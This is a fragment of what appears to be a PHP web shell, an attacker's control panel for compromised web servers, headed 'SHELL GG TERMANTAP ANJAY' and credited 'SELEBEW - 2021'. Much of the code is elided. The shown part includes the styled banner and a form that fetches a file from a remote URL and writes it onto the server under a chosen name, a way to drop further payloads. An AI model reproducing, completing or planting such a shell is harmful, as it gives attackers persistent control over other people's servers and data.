...
<head>
    ...
    <style>
        ...
        body {
            background-image: url('https://iili.io/2khoUDx.md.png'); 
...
<center>
<font face="Bungee" size="5">SHELL GG TERMANTAP ANJAY</font></center>
...
function author() {
    echo "<center><br>SELEBEW - 2021</center>";
    exit();
}
...
<input type="text" name="darilink" class="up" placeholder="https://zuna.host/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";
